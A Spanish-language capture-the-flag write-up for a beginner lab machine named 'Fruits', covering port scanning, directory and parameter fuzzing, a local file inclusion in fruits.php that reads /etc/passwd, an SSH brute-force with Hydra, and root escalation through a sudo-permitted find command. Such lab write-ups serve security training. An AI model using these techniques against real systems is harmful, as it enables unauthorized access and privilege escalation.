---
description: '🔍 Dificultad: Principiante'
---

# Fruits

### 🔍 **RECONOCIMIENTO**

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 192.168.1.60
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/imagen (16).png" alt=""><figcaption></figcaption></figure>

A continuación, se realiza el comando:

```bash
nmap -sVC -p- -n --min-rate 5000 192.168.1.60
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/imagen (17).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 22** perteneciente al **servicio SSH** y el **puerto 80** perteneciente al **servicio HTTP** están abiertos por lo que a continuación se indagará más.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p22,80 -v 192.168.1.60
```

para obtener más información sobre ese puerto específicamente.

<figure><img src="../../.gitbook/assets/imagen (18).png" alt=""><figcaption></figcaption></figure>

Seguimos indagando más sobre los puertos y ahora exploramos el servicio **HTTP**. Ingresamos la IP y nos encontramos una página de frutas para buscarlas.

<figure><img src="../../.gitbook/assets/imagen (19).png" alt=""><figcaption></figcaption></figure>

Ahora buscaremos directorios con la herramienta **Gobuster** a través de:

```bash
gobuster dir -u http://192.168.1.60/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,doc,html -t 100
```

<figure><img src="../../.gitbook/assets/imagen (20).png" alt=""><figcaption></figcaption></figure>

Después de realizar una revisión inicial, observamos que al acceder al directorio `/fruits.php`, este aparece en blanco. Esto nos lleva a sospechar que podría tratarse de una vulnerabilidad de inclusión local de archivos (LFI, por sus siglas en inglés). Para confirmar esta hipótesis y explorar posibles parámetros que alteren el comportamiento de la página, decidimos utilizar la herramienta **wfuzz**. El objetivo es identificar parámetros ocultos o no documentados que permitan explotar la vulnerabilidad o arrojar más información sobre el funcionamiento del archivo.

A continuación, ejecutamos **wfuzz** para enumerar parámetros potenciales que puedan estar presentes en la página y desencadenar un comportamiento diferente, lo cual nos ayudará a validar si realmente estamos ante una vulnerabilidad LFI.

```bash
wfuzz -c --hl=1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://192.168.1.60/fruits.php?FUZZ=/etc/passwd
```

<figure><img src="../../.gitbook/assets/imagen (21).png" alt=""><figcaption></figcaption></figure>

Ahora debemos ingresar en el buscador esto:

```bash
http://192.168.1.60/fruits.php?file=/etc/passwd
```

<figure><img src="../../.gitbook/assets/imagen (22).png" alt=""><figcaption></figcaption></figure>

Observamos que el comando **file** nos devuelve un resultado exitoso, revelando el contenido del archivo `/etc/passwd`. Esto nos permite identificar los usuarios del sistema. Entre ellos, destaca el usuario **bananaman**, ya que tiene acceso a la shell `/bin/bash`. Este detalle es relevante, ya que indica que **bananaman** es un usuario con permisos de inicio de sesión en el sistema, lo que podría ser útil para futuras acciones de escalada de privilegios o acceso remoto.

### 🚀 **EXPLOTACIÓN**

Con la información obtenida anteriormente, realizamos el comando:

```
hydra -l bananaman -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.60
```

que utiliza la herramienta **Hydra** para realizar un ataque de fuerza bruta contra el servicio **SSH** de una máquina con la IP **192.168.1.60**.

<figure><img src="../../.gitbook/assets/imagen (23).png" alt=""><figcaption></figcaption></figure>

Al realizar el ataque de fuerza bruta, hemos descubierto la contraseña de **bananaman**. Sabiendo esto, nos conectamos a través de **SSH** al usuario con el comando:

```bash
ssh bananaman@192.168.1.60
```

<figure><img src="../../.gitbook/assets/imagen (24).png" alt=""><figcaption></figcaption></figure>

### 🔐 PRIVILEGIOS

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar.

<figure><img src="../../.gitbook/assets/imagen (25).png" alt=""><figcaption></figcaption></figure>

Al ejecutar el comando `sudo -l`, observamos que tenemos permisos para ejecutar el comando `find` como el usuario root. Esto indica que podríamos explotar esta configuración para elevar nuestros privilegios. Consultando la web de **GTFOBins**, encontramos que el comando `find` es vulnerable y puede ser utilizado para obtener acceso con privilegios de root.

La secuencia de comandos que nos permite aprovechar esta vulnerabilidad es la siguiente, tomada directamente de [GTFOBins](https://gtfobins.github.io/gtfobins/find/):

```
sudo /usr/bin/find -exec /bin/sh -p \; -quit
```

<figure><img src="../../.gitbook/assets/imagen (26).png" alt=""><figcaption></figcaption></figure>

Hemos finalizado con éxito **todas las etapas del proceso** y cumplido con todos los **requisitos**.&#x20;

¡Buena suerte en tu búsqueda de las **flags**! Recuerda prestar atención a cada detalle, examinar los archivos y servicios detenidamente, y utilizar todas las herramientas a tu alcance para encontrarlas. ¡La clave está en la perseverancia y en no dejar nada sin explorar! ¡Adelante, hacker! 💻🔍🚀
